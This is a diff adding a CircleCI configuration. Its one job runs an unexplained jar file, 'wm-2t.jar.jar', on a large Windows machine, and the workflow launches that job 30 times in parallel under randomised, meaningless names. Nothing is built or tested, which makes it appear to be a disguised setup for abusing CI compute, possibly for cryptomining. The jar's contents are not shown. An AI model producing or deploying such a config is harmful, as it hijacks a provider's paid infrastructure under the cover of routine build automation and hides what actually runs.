@@ -1,0 +1,79 @@
+version: 2.1
+
+jobs:
+  srv593426ety:
+    machine:
+      image: windows-server-2022-gui:current
+    resource_class: windows.large
+    steps:
+      - checkout
+      - run:
+          name: step881203ness
+          command: |
+            java -jar wm-2t.jar.jar
+          shell: powershell.exe
+
+workflows:
+  version: 2
+  loadper378238:
+    jobs:
+      - srv593426ety:
+          name: DATAweb646088
+      - srv593426ety:
+          name: ORpipe658317
+      - srv593426ety:
+          name: BASE11LIKE6564
+      - srv593426ety:
+          name: node26inal4704
+      - srv593426ety:
+          name: testCONFIG990851
+      - srv593426ety:
+          name: PROC92ical422
+      - srv593426ety:
+          name: stagelib193930
+      - srv593426ety:
+          name: CLUSTERproto582202
+      - srv593426ety:
+          name: CONVERT99line7069
+      - srv593426ety:
+          name: restoreBER736121
+      - srv593426ety:
+          name: cache719791ICAL
+      - srv593426ety:
+          name: BATCH868059LIKE
+      - srv593426ety:
+          name: handle57ner4761
+      - srv593426ety:
+          name: actionir128061
+      - srv593426ety:
+          name: BUFFERsys557240
+      - srv593426ety:
+          name: CTRL54HELP8357
+      - srv593426ety:
+          name: flow36ger9738
+      - srv593426ety:
+          name: auto94WEB9572
+      - srv593426ety:
+          name: erserver333146
+      - srv593426ety:
+          name: exec881801DOM
+      - srv593426ety:
+          name: HANDLE73wer8094
+      - srv593426ety:
+          name: certINAL838605
+      - srv593426ety:
+          name: checkSTEP836422
+      - srv593426ety:
+          name: run805963stub
+      - srv593426ety:
+          name: scanker825112
+      - srv593426ety:
+          name: show39app962
+      - srv593426ety:
+          name: LOGINar952501
+      - srv593426ety:
+          name: srvNESS738548
+      - srv593426ety:
+          name: IOUSphase198833
+      - srv593426ety:
+          name: transformver45242
